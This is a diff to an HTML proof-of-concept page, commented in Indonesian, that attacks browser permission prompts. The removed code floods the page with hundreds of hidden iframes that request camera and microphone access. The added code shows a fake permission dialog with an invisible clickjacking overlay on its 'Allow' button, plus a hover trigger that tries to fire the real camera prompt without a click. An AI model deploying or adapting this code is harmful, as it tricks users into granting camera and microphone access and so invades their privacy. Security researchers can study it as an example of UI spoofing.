@@ -3,118 +3,135 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Update</title>
+<title>Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #000; color: #0f0;
-    font-family: monospace; overflow: hidden;
-    height: 100vh; display: flex; justify-content: center; align-items: center;
+    background: #f4f6f8;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; margin: 0;
   }
-  #status { font-size: 24px; text-align: center; z-index: 10000; position: relative; }
-  iframe { display: none; }
+  .panel {
+    background: #fff; padding: 40px; border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
+    max-width: 400px; width: 100%; position: relative;
+  }
+  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
+  p { color: #666; margin-bottom: 20px; font-size: 14px; }
+  
+  /* UI PALSU (Menyerupai Prompt Browser) */
+  .fake-prompt {
+    background: #fff;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    margin-top: 20px;
+    text-align: left;
+    position: relative;
+  }
+  .fake-prompt h3 { font-size: 16px; margin-bottom: 5px; color: #333; }
+  .fake-prompt p { font-size: 13px; color: #666; margin-bottom: 15px; }
+  .fake-prompt .btn-group {
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+  }
+  .fake-prompt button {
+    padding: 8px 16px;
+    border-radius: 4px;
+    font-size: 14px;
+    cursor: pointer;
+    border: none;
+  }
+  .btn-block { background: #f0f0f0; color: #333; }
+  .btn-allow { background: #007aff; color: #fff; font-weight: bold; position: relative; }
+
+  /* Tombol Transparan Penjebak (Clickjacking) */
+  .trap-btn {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    opacity: 0;
+    cursor: pointer;
+    z-index: 10;
+  }
+
+  #log {
+    margin-top: 20px; background: #000; color: #0f0;
+    padding: 10px; font-family: monospace; font-size: 12px;
+    border-radius: 6px; width: 100%; max-width: 400px;
+    height: 100px; overflow-y: auto; text-align: left;
+  }
 </style>
 </head>
 <body>
 
-<div id="status">Memulai Flooding...</div>
+<div class="panel">
+  <h1>🔒 Security Check</h1>
+  <p>Verifikasi diperlukan untuk melanjutkan.</p>
+  
+  <!-- UI PALSU -->
+  <div class="fake-prompt">
+    <h3>artha231.github.io ingin:</h3>
+    <p>Menggunakan kamera dan mikrofon Anda.</p>
+    <div class="btn-group">
+      <button class="btn-block" style="position: relative;">
+        Blokir
+        <!-- (Tidak ada trap di sini, agar user merasa aman) -->
+      </button>
+      <button class="btn-allow" id="allowBtn">
+        Izinkan
+        <!-- Tombol Transparan Penjebak -->
+        <div class="trap-btn" id="trapBtn"></div>
+      </button>
+    </div>
+  </div>
+</div>
+
+<div id="log">Sistem siap...</div>
 
 <script>
 (function () {
   'use strict';
 
-  var statusEl = document.getElementById('status');
-  var iframeCount = 0;
-  var maxIframes = 500; // Jumlah iframe (500 sudah sangat berat)
+  var logEl = document.getElementById('log');
+  function log(msg) {
+    logEl.innerHTML += "> " + msg + "<br>";
+    console.log(msg);
+  }
 
   // ============================================
-  // 1. PAYLOAD UNTUK SETIAP IFRAME (MEMINTA KAMERA)
+  // 1. TRAP CLICK (Memicu Kamera)
   // ============================================
-  var iframePayload = `
-    <!DOCTYPE html>
-    <html>
-    <head><title>Permission</title></head>
-    <body style="background:transparent;margin:0;">
-      <script>
-        (function() {
-          // Paksa minta izin kamera di setiap iframe
-          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-              .then(function(stream) {
-                parent.postMessage({ status: 'CAM_GRANTED' }, '*');
-              })
-              .catch(function(err) {
-                // Abaikan error agar tidak crash
-              });
-          }
-        })();
-      <\/script>
-    </body>
-    </html>
-  `;
-
-  // ============================================
-  // 2. LISTENER: MENDETEKSI KEBOCORAN IZIN
-  // ============================================
-  window.addEventListener('message', function(e) {
-    if (e.data && e.data.status === 'CAM_GRANTED') {
-      statusEl.innerText = "🚨 BUG: PERMISSION LEAK DETECTED! 🚨";
-      statusEl.style.color = "#f00";
-      document.body.style.background = "#300";
-      console.log("[!] Permission Leak Detected! Camera Access Granted.");
+  document.getElementById('trapBtn').addEventListener('click', function() {
+    log("[!] Tombol 'Izinkan' palsu diklik.");
+    
+    // Pemicu Prompt Asli secara instan (Transient Activation)
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(function(stream) {
+          log("🚨 KAMERA DIIZINKAN! (Spoofing Berhasil)");
+          // Hentikan stream setelah diizinkan (opsional)
+          stream.getTracks().forEach(function(t) { t.stop(); });
+        })
+        .catch(function(err) {
+          log("✅ Kamera diblokir browser: " + err.name);
+        });
     }
   });
 
   // ============================================
-  // 3. FUNGSI MULTI-IFRAME FLOODING
+  // 2. ZERO-CLICK TRIGGER (Hover)
   // ============================================
-  function floodIframes() {
-    if (iframeCount >= maxIframes) {
-      statusEl.innerText = "Flooding Selesai. Memeriksa...";
-      return;
+  document.getElementById('allowBtn').addEventListener('mouseover', function() {
+    log("[!] Hover terdeteksi. Memicu prompt asli...");
+    // Mencoba memunculkan prompt saat hover (mungkin diblokir)
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true }).catch(function(){});
     }
-
-    try {
-      // Buat iframe baru
-      var iframe = document.createElement('iframe');
-      
-      // Beri atribut allow untuk memancing prompt izin
-      iframe.allow = "camera; microphone; autoplay";
-      
-      // Set src ke about:blank agar bisa ditulis (Same-Origin)
-      iframe.src = 'about:blank';
-      
-      // Sembunyikan iframe
-      iframe.style.display = 'none';
-      
-      // Tambahkan ke DOM
-      document.body.appendChild(iframe);
-
-      // Tulis payload ke dalam iframe
-      iframe.onload = function() {
-        try {
-          var doc = iframe.contentDocument || iframe.contentWindow.document;
-          doc.open();
-          doc.write(iframePayload);
-          doc.close();
-        } catch(e) {}
-      };
-
-      iframeCount++;
-      statusEl.innerText = "Membuat Iframe: " + iframeCount + "/" + maxIframes;
-
-      // Loop super cepat (0ms)
-      setTimeout(floodIframes, 0);
-
-    } catch(e) {
-      console.log("Flooding error:", e);
-    }
-  }
-
-  // ============================================
-  // 4. EKSEKUSI
-  // ============================================
-  setTimeout(floodIframes, 500);
+  });
 
 })();
 </script>
